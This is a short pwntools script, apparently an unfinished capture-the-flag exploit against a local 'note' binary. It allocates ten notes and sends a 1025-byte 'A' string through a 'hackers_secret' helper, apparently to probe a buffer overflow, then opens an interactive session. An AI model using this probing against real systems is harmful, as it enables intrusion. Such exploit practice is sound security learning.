#!/usr/bin/python3

from pwn import *
from notes_primitives import NotesPrimitievs

elf = ELF('./note')


def conn():
    if args.LOCAL:
        r = process([elf.path])  
    elif args.D:
        raise NotImplemented()
    else:
        raise NotImplemented()

    return r


def main():

    primitives = NotesPrimitievs(conn())



    adr_lst = []
    for _ in range(10):
        adr_lst.append(primitives.create_note())

    print(adr_lst)

    primitives.hackers_secret(b'A' * 1025)

    primitives.conn.interactive()

if __name__ == "__main__":
    main()
    
